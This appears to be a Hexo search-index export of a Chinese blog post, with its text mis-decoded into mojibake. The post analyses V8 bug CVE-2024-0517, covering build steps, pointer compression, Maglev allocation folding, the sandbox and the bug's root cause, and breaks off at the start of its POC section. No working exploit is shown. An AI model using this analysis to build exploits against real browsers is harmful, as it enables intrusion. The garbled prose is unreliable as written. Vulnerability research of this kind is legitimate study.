<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>V8-pwnå…¥é—¨(4)â€”â€”CVE-2024-0517åˆ†æ</title>
      <link href="/2025/05/28/V8-pwn%E5%85%A5%E9%97%A8-4-%E2%80%94%E2%80%94CVE-2024-0517%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/28/V8-pwn%E5%85%A5%E9%97%A8-4-%E2%80%94%E2%80%94CVE-2024-0517%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-ç¯å¢ƒé…ç½®"><a href="#0x00-ç¯å¢ƒé…ç½®" class="headerlink" title="0x00 ç¯å¢ƒé…ç½®"></a>0x00 ç¯å¢ƒé…ç½®</h2><p>æ„å»ºå¯¹åº”ç‰ˆæœ¬çš„V8</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git checkout e73f620c2ef1230ddaa61551706225821a87c3b9</span><br><span class="line">gclient <span class="built_in">sync</span> -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># build V8</span></span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">gn gen out/debug --args=<span class="string">&#x27;v8_no_inline=true v8_optimized_debug=false is_component_build=false v8_expose_memory_corruption_api=true&#x27;</span></span><br><span class="line">ninja -C out/debug d8</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div><h2 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h2><h3 id="Pointer-Compression"><a href="#Pointer-Compression" class="headerlink" title="Pointer Compression"></a>Pointer Compression</h3><p>ğŸ’¡V8åœ¨chrome80ä»¥åå¼•å…¥æŒ‡é’ˆå‹ç¼©æœºåˆ¶ï¼Œç®€å•æ¥è¯´æ˜¯æŠŠåŸæœ¬64ä½çš„åœ°å€åˆ†ä¸ºé«˜32ä½çš„baseå’Œä½32ä½çš„offsetï¼Œbaseç”±å…¨å±€å˜é‡å­˜å‚¨ï¼Œå†…å­˜ä¸­åªéœ€è¦å­˜å‚¨offsetï¼Œå› æ­¤æŸ¥çœ‹å†…å­˜åˆ†å¸ƒç”¨wå•ä½</p><p>å‹ç¼©å‰çš„æŒ‡é’ˆ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">            |----- 32 bits -----|----- 32 bits -----|</span><br><span class="line">Pointer:    |________base_______|______offset_____w1|</span><br></pre></td></tr></table></figure></div><p>å‹ç¼©å</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                    |----- 32 bits -----|----- 32 bits -----|</span><br><span class="line">Compressed pointer:                     |______offset_____w1|</span><br><span class="line">Compressed Smi:                         |____int31_value___0|</span><br></pre></td></tr></table></figure></div><p>åœ¨æŒ‡é’ˆå‹ç¼©çš„èƒŒæ™¯ä¸‹ï¼Œæˆ‘ä»¬å†æ¥è§£è¯»å†…å­˜åˆ†å¸ƒï¼Œä¸‹é¢åˆ—å‡ºçš„32bitsçš„éƒ½æ˜¯å‹ç¼©åçš„offsetæˆ–32ä½çš„smiï¼Œéœ€è¦æ³¨æ„çš„æ˜¯smiå­˜å‚¨æ—¶ç›¸å½“äºæŠŠåŸå§‹å€¼å·¦ç§»ä¸€ä½ï¼Œå¹¶ä¸”æœ€ä½ä½ç”±0å¡«å……</p><p>å¯ä»¥çœ‹åˆ°ä¾æ¬¡å­˜å‚¨ç€Map*ã€elementsã€propertiesã€ä»¥åŠå„å±æ€§çš„å€¼ï¼ˆ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼‰</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16wx <span class="number">0x3aef001c94ad</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x3aef001c94ac</span>:<span class="number">0x000d9f4d</span>(<span class="title class_">Map</span>*)<span class="number">0x000006cd</span>(elements)<span class="number">0x000006cd</span>(properties)<span class="number">0x00000002</span>(<span class="number">1</span>çš„smi)</span><br><span class="line"><span class="number">0x3aef001c94bc</span>:<span class="number">0x00000004</span>(<span class="number">2</span>çš„smi)<span class="number">0x00000006</span>(<span class="number">3</span>çš„smi)<span class="number">0x00000008</span>(<span class="number">4</span>çš„smi)<span class="number">0x0000062d</span></span><br><span class="line"><span class="number">0x3aef001c94cc</span>:<span class="number">0x00010001</span><span class="number">0x00000000</span><span class="number">0x000006f5</span><span class="number">0x00002a21</span></span><br><span class="line"><span class="number">0x3aef001c94dc</span>:<span class="number">0x00000084</span><span class="number">0x00000002</span><span class="number">0x0000062d</span><span class="number">0x00020002</span></span><br></pre></td></tr></table></figure></div><p>ç”±äºå‹ç¼©å®Œçš„æŒ‡é’ˆåªæœ‰32ä½ï¼Œå› æ­¤è¢«æ”¾åœ¨4GBå¤§å°çš„Pointer Compression Cageä¸­</p><h3 id="Allocation-Folding"><a href="#Allocation-Folding" class="headerlink" title="Allocation Folding"></a>Allocation Folding</h3><p>Allocation Foldingå°†å¤šä¸ªä¸´è¿‘çš„å¯¹è±¡åˆ†é…æ“ä½œåˆå¹¶ä¸ºä¸€æ¬¡å†…å­˜åˆ†é…ï¼Œä»¥å‡å°‘å†…å­˜ç¢ç‰‡å’Œæå‡æ‰§è¡Œæ€§èƒ½ï¼Œè¿™ä¸€å—ç”±Maglevè´Ÿè´£ï¼ŒMaglevæ˜¯ä¸€ä¸ªä¸­é€ŸJITï¼ˆä»‹äºSparkplugå’ŒTurboFanä¹‹é—´ï¼‰ã€‚é’ˆå¯¹ä¸‹é¢ä¾‹å­ï¼Œå‡è®¾<code>Instance</code>å’Œ<code>Array a</code>åˆ†åˆ«éœ€è¦12å’Œ88å­—èŠ‚ï¼Œé‚£ä¹ˆMaglevå°±ä¼šå°†ä¸¤ä¸ªå†…å­˜åˆ†é…æŠ˜å æˆä¸€ä¸ª100å­—èŠ‚çš„åˆ†é…ï¼Œå¹¶å°†<code>Array a</code>æ”¾åœ¨<code>FirstAllocate_addr+12</code>ä¸Šï¼Œå› ä¸º<code>Instance</code>éœ€è¦12å­—èŠ‚ã€‚</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/image-20250528155240036.png"                      alt="image-20250528155240036" style="zoom:50%;"                 ><figcaption>image-20250528155240036</figcaption></figure><p>ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„å…·ä½“ä¾‹å­</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(f);<span class="comment">//é¢„å¤„ç†ä»¥ä¾›v8ä¼˜åŒ–ï¼Œä¸»è¦æ˜¯æ”¶é›†ä¸€äº›è¿è¡Œæ—¶ä¿¡æ¯</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(f);<span class="comment">//ä¸‹ä¸€æ¬¡è°ƒç”¨få‡½æ•°æ—¶ä½¿ç”¨Maglevä¼˜åŒ–</span></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div><p>æ‰§è¡Œä»¥è§‚å¯Ÿmaglev graphçš„æ„å»ºè¿‡ç¨‹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./d8 --allow-natives-syntax --shell --trace-maglev-graph-building poc1.js</span></span><br><span class="line">...</span><br><span class="line">== New block (merge) at 0x1c2b000db2ad &lt;SharedFunctionInfo f&gt;==</span><br><span class="line">  0x55d3ffa732a8  n7: AllocateRaw(Young, 16) â†’ (x), 0 uses # ğŸŒŸåœ¨æ–°ç”Ÿä»£åˆ†é…äº†16å¤§å°çš„å†…å­˜ï¼Œç”¨æ¥å­˜FixedDoubleArray</span><br><span class="line">  ! Clearing unstable node aspects # ä¸Šé¢çš„åˆ†é…è¢«æ ‡è®°ä¸ºä¸ç¨³å®šï¼Œåç»­å¯èƒ½ä¼šä¼˜åŒ–</span><br><span class="line">  0x55d3ffa73318  n8: StoreMap(0x1c2b00000851 &lt;Map(FIXED_DOUBLE_ARRAY_TYPE)&gt;) [n7:(x)]</span><br><span class="line">  0x55d3ffa73400  n10: StoreTaggedFieldNoWriteBarrier(0x4) [n7:(x), n9:(x)]</span><br><span class="line">  ! Clearing unstable node aspects</span><br><span class="line">  0x55d3ffa734d8  n12: StoreFloat64(0x8) [n7:(x), n11:(x)]</span><br><span class="line">  0x55d3ffa73510  n13: FoldedAllocation(+16) [n7:(x)] â†’ (x), 0 uses # ğŸŒŸä¼˜åŒ–çš„åœ°æ–¹ï¼ŒæŠ˜å åˆ†é…ï¼Œåœ¨å‰é¢16å­—èŠ‚çš„åŸºç¡€ä¸Šï¼Œæ¥ç€åˆ†é…ç©ºé—´ç»™JSArray</span><br><span class="line">  ! Clearing unstable node aspects</span><br><span class="line">  0x55d3ffa73580  n14: StoreMap(0x1c2b000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;) [n13:(x)]</span><br><span class="line">  0x55d3ffa736c0  n16: StoreTaggedFieldNoWriteBarrier(0x4) [n13:(x), n15:(x)]</span><br><span class="line">  0x55d3ffa73718  n17: StoreTaggedFieldNoWriteBarrier(0xc) [n13:(x), n9:(x)]</span><br><span class="line">  0x55d3ffa73770  n18: StoreTaggedFieldNoWriteBarrier(0x8) [n13:(x), n7:(x)]</span><br><span class="line">   4 : c6                Star0</span><br><span class="line">   5 : 65 af 01 f9 01    CallRuntime [DebugPrint], r0-r0</span><br><span class="line">  ! Clearing unstable node aspects</span><br><span class="line">  0x55d3ffa73850  n19: CallRuntime(DebugPrint) [n3:(x), n13:(x)] â†’ (x), 0 uses</span><br><span class="line">  10 : 0e                LdaUndefined</span><br><span class="line">  11 : ab                Return</span><br><span class="line">  0x55d3ffa738f8  n20: ReduceInterruptBudgetForReturn(11)</span><br><span class="line">  0x55d3ffa73930  n21: Return [n4:(x)]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>è€Œå½“æˆ‘ä»¬æŸ¥çœ‹æœ€ç»ˆå¾—åˆ°çš„åŒ…å«IRçš„maglev graphæ—¶ï¼Œä¼šå‘ç°maglevå°†<code>AllocateRaw(16) + FoldedAllocation(+16)</code>åˆå¹¶æˆ<code>AllocateRaw(32)</code></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./d8 --allow-natives-syntax --print-maglev-graph poc1.js</span></span><br><span class="line">...</span><br><span class="line">After register allocation</span><br><span class="line">Graph</span><br><span class="line"></span><br><span class="line">    1/3: Constant(0x1f6b000c3c89 &lt;NativeContext[285]&gt;) â†’ v-1, live range: [1-19]</span><br><span class="line">    2/2: Constant(0x1f6b000db355 &lt;JSFunction f (sfi = 0x1f6b000db2ad)&gt;) â†’ v-1, live range: [2-19]</span><br><span class="line">    3/4: RootConstant(undefined_value) â†’ v-1, live range: [3-21]</span><br><span class="line">   4/15: RootConstant(empty_fixed_array) â†’ v-1, live range: [4-16]</span><br><span class="line">    5/9: SmiConstant(1) â†’ v-1, live range: [5-17]</span><br><span class="line">   6/11: Float64Constant(1.1) â†’ v-1, live range: [6-13]</span><br><span class="line"> Block b1</span><br><span class="line">0x1f6b000db2ad &lt;SharedFunctionInfo f&gt; (0x1f6b001c9b89 &lt;String[7]: &quot;poc1.js&quot;&gt;)</span><br><span class="line">   0 : CreateArrayLiteral [0], [0], #37</span><br><span class="line">    7/1: InitialValue(&lt;this&gt;) â†’ [stack:-6|t], live range: [7-19]</span><br><span class="line">    8/5: FunctionEntryStackCheck</span><br><span class="line">         â†³ lazy @-1 (2 live vars)</span><br><span class="line">    9/6: Jump b2</span><br><span class="line">      â†“</span><br><span class="line"> Block b2</span><br><span class="line">   10/7: AllocateRaw(Young, 32) â†’ [rdi|R|t], live range: [10-18] # ğŸŒŸä¸€æ¬¡æ€§åˆ†é…32å­—èŠ‚</span><br><span class="line">   11/8: StoreMap(0x1f6b00000851 &lt;Map(FIXED_DOUBLE_ARRAY_TYPE)&gt;) [v10/n7:[rdi|R|t]]</span><br><span class="line">     22: ConstantGapMove(v5/n9 â†’ [rax|R|t])</span><br><span class="line">  12/10: StoreTaggedFieldNoWriteBarrier(0x4) [v10/n7:[rdi|R|t], v5/n9:[rax|R|t]]</span><br><span class="line">     23: ConstantGapMove(v6/n11 â†’ [xmm0|R|f64])</span><br><span class="line">  13/12: StoreFloat64(0x8) [v10/n7:[rdi|R|t], v6/n11:[xmm0|R|f64]]</span><br><span class="line">  14/13: FoldedAllocation(+16) [v10/n7:[rdi|R|t]] â†’ [rcx|R|t], live range: [14-19]</span><br><span class="line">     24: GapMove([rdi|R|t] â†’ [rdx|R|t])</span><br><span class="line">     25: GapMove([rcx|R|t] â†’ [rdi|R|t])</span><br><span class="line">  15/14: StoreMap(0x1f6b000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;) [v14/n13:[rdi|R|t]]</span><br><span class="line">     26: ConstantGapMove(v4/n15 â†’ [rbx|R|t])</span><br><span class="line">  16/16: StoreTaggedFieldNoWriteBarrier(0x4) [v14/n13:[rcx|R|t], v4/n15:[rbx|R|t]]</span><br><span class="line">  17/17: StoreTaggedFieldNoWriteBarrier(0xc) [v14/n13:[rcx|R|t], v5/n9:[rax|R|t]]</span><br><span class="line">  18/18: StoreTaggedFieldNoWriteBarrier(0x8) [v14/n13:[rcx|R|t], v10/n7:[rdx|R|t]]</span><br><span class="line">     27: ConstantGapMove(v1/n3 â†’ [rsi|R|t])</span><br><span class="line">   5 : CallRuntime [DebugPrint], r0-r0</span><br><span class="line">  19/19: ğŸ¢ CallRuntime(DebugPrint) [v1/n3:[rsi|R|t], v14/n13:[rcx|R|t]] â†’ [rax|R|t]</span><br><span class="line">         â†³ lazy @5 (2 live vars)</span><br><span class="line">  11 : Return</span><br><span class="line">  20/20: ReduceInterruptBudgetForReturn(11)</span><br><span class="line">     28: ConstantGapMove(v3/n4 â†’ [rax|R|t])</span><br><span class="line">  21/21: Return [v3/n4:[rax|R|t]]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥è°ƒè¯•éªŒè¯ä¸€ä¸‹å‰é¢åˆ†é…çš„16å­—èŠ‚ï¼Œä¿®æ”¹æ–‡ä»¶</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(f);</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(f);</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div><p>gdbè¿è¡Œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb --args ./d8 --allow-natives-syntax poc1.js</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¼˜åŒ–åçš„JSArray</span></span><br><span class="line">DebugPrint: 0xd91001ca949: [JSArray]</span><br><span class="line"> - map: 0x0d91000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d91000ce935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x0d91001ca939 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x0d91000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0xd9100000d41: [String] in ReadOnlySpace: #length: 0x0d910030ec35 &lt;AccessorInfo name= 0x0d9100000d41 &lt;String[6]: #length&gt;, data= 0x0d9100000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x0d91001ca939 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line"> 0xd91000cefc1: [Map] in OldSpace</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›çœ‹çœ‹å†…å­˜å¸ƒå±€ï¼Œæ³¨æ„æ­¤æ—¶æ˜¯åœ¨æŒ‡é’ˆå‹ç¼©èƒŒæ™¯ä¸‹ï¼ŒæŒ‡é’ˆéƒ½æ˜¯32ä½</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/16wx 0xd91001ca949-1</span></span><br><span class="line">0xd91001ca948:0x000cefc1(Map*)0x000006cd(Properties*)0x001ca939(elements*)0x00000002(æ•°ç»„é•¿åº¦ï¼Œ1çš„smi)</span><br><span class="line">0xd91001ca958:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br><span class="line">0xd91001ca968:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br><span class="line">0xd91001ca978:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br></pre></td></tr></table></figure></div><p>æ ¹æ®JSArrayçš„å¯¹è±¡æ¨¡å‹ï¼Œè¿™ä¸ªelements*å°±æŒ‡å‘ä¸€ä¸ªFixedArrayï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªåœ°å€åˆšå¥½å’ŒJSArrayå·®16å­—èŠ‚ï¼Œæ˜¯ä¸€ä¸ªFixedDoubleArrayï¼ˆç”¨æ¥å­˜Arrayä¸­çš„å…·ä½“å…ƒç´ ï¼‰ï¼Œå¯¹åº”äº†maglevä¸€å¼€å§‹åœ¨æ–°ç”Ÿä»£åˆ†é…äº†16å¤§å°çš„å†…å­˜</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/16wx 0xd91001ca939-1</span></span><br><span class="line">0xd91001ca938:0x00000851(Map*)0x00000002(æ•°ç»„é•¿åº¦ï¼Œ1çš„smi)0x9999999a0x3ff19999 (8å­—èŠ‚ä¸€èµ·è¡¨ç¤º1.1è¿™ä¸ªdoubleå€¼)</span><br><span class="line">0xd91001ca948:0x000cefc10x000006cd0x001ca9390x00000002</span><br><span class="line">0xd91001ca958:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br><span class="line">0xd91001ca968:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br></pre></td></tr></table></figure></div><h3 id="UberCage"><a href="#UberCage" class="headerlink" title="UberCage"></a>UberCage</h3><p>UberCageæ˜¯V8çš„sandboxï¼ŒV8åœ¨å¯åŠ¨æ—¶ï¼Œä¼šä¿ç•™ä¸€æ®µåœ°å€ç©ºé—´åŒºåŸŸ(1TB)ä½œä¸ºV8çš„sandboxï¼Œè¿™ç§éš”ç¦»æœ‰ä¸¤ç§å®ç°æ–¹å¼</p><ul><li><p>å¦‚æœbufferä½äºsandboxå†…ï¼Œå°±å°†40ä½çš„åœ°å€åç§»å·¦ç§»24ä½åå¾—åˆ°çš„64ä½ç»“æœå†™å…¥ç›¸åº”å­—æ®µåœ°å€ä¸­</p></li><li><p>å¦‚æœbufferä½äºsandboxå¤–ï¼Œåˆ™ä¼šå°†æŒ‡å®šå­—æ®µåœ°å€å†…çš„å€¼ä½œä¸ºç´¢å¼•ï¼Œé€šè¿‡æŒ‡é’ˆè¡¨(Pointer Tables)é—´æ¥çš„å¼•ç”¨buffer</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/image-20250528163722162.png"                      alt="image-20250528163722162" style="zoom:50%;"                 ><figcaption>image-20250528163722162</figcaption></figure></li></ul><p>æ€»ä½“ä¸ŠV8çš„heap sandboxå¯ä»¥æ€»ç»“ä¸ºä¸‹å›¾</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/image-20250528165937825.png"                      alt="image-20250528165937825" style="zoom:50%;"                 ><figcaption>image-20250528165937825</figcaption></figure><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h2><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>V8 åœ¨ä¼˜åŒ–æ´¾ç”Ÿç±»ï¼ˆclass A extends Bï¼‰çš„æ„é€ å‡½æ•°æ—¶ï¼Œä¼šç”¨<code>TryBuildFindNonDefaultConstructorOrConstruct()</code>æ²¿ç€åŸå‹é“¾å‘ä¸Šæ‰¾æ„é€ å‡½æ•°ã€‚</p><p>å…·ä½“æ¥è¯´ï¼ŒV8ä¼šï¼š</p><ul><li>éå†åŸå‹é“¾ä»¥æ‰¾åˆ°åˆé€‚çš„æ„é€ å‡½æ•°ï¼ŒåŒæ—¶è¿˜éœ€è¦æ‰§è¡Œå¯¹åº”çš„ç±»å‹æ£€æŸ¥ï¼ˆæ¯”å¦‚éªŒè¯Mapï¼Œå³Hidden Classï¼‰ï¼Œä»¥é¿å…ç±»å‹æ··æ·†</li><li>å¦‚æœç±»å‹æ£€æŸ¥éƒ½é€šè¿‡ï¼ŒV8å°±ä¼šç”¨<code>BuildAllocateFastObject()</code>åˆ†é…å†…å­˜æ¥åˆ›å»ºå¯¹è±¡ï¼Œè¿™ä¸ªå‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨<code>ExtendOrReallocateCurrentRawAllocation()</code>ï¼Œè¯¥å‡½æ•°ç”¨äºå†³å®šæ˜¯æ–°åˆ†é…ä¸€å—å†…å­˜ï¼Œè¿˜æ˜¯æ‰©å±•ä¹‹å‰çš„åˆ†é…ã€‚</li><li>åˆ†é…æŠ˜å ï¼š<code>ExtendOrReallocateCurrentRawAllocation()</code>ä¼šæ ¹æ®ä¹‹å‰æœ€è¿‘ä¸€æ¬¡åˆ†é…æ˜¯å¦å¯ä»¥å’Œå½“å‰åˆ†é…â€œæŠ˜å â€æ¥å†³å®šå¦‚ä½•åˆ†é…å†…å­˜ã€‚å¦‚æœåˆ†é…å¤§å°è¶…è¿‡ä¸€å®šé˜ˆå€¼ï¼Œå°±ä¼šè¿›è¡Œæ–°çš„åˆ†é…ï¼›å¦åˆ™å°±æŠ˜å è¿›ç°æœ‰åˆ†é…ä¸­ï¼Œä»è€Œå‡å°‘å†…å­˜ç¢ç‰‡å’Œæå‡æ€§èƒ½ã€‚</li></ul><p>è€Œæ¼æ´ç‚¹åœ¨äºï¼šè°ƒç”¨ super()ï¼ˆå³è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼‰åï¼ŒæŸäº›å…³é”®å†…å­˜æ²¡æœ‰è¢«æ­£ç¡®åˆå§‹åŒ–ã€‚å¦‚æœæ­¤æ—¶åˆç«‹å³åˆ›å»ºäº†å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œè¿™æ®µå°šæœªåˆå§‹åŒ–çš„å†…å­˜è¢«é‡ç”¨ï¼Œå°±å¯èƒ½å‡ºç°OOB</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>å…ˆçœ‹ä¸€ä¸ªç®€å•çš„åˆ†é…æŠ˜å ä¾‹å­</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>; <span class="comment">//å°†æ­£åœ¨æ„é€ çš„ç±»çš„å¼•ç”¨èµ‹å€¼ç»™x</span></span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        a = [<span class="number">1.1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(B);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br></pre></td></tr></table></figure></div><blockquote><p>Bç»§æ‰¿è‡ªA</p></blockquote><p>æŸ¥çœ‹ä¼˜åŒ–è¿‡ç¨‹</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 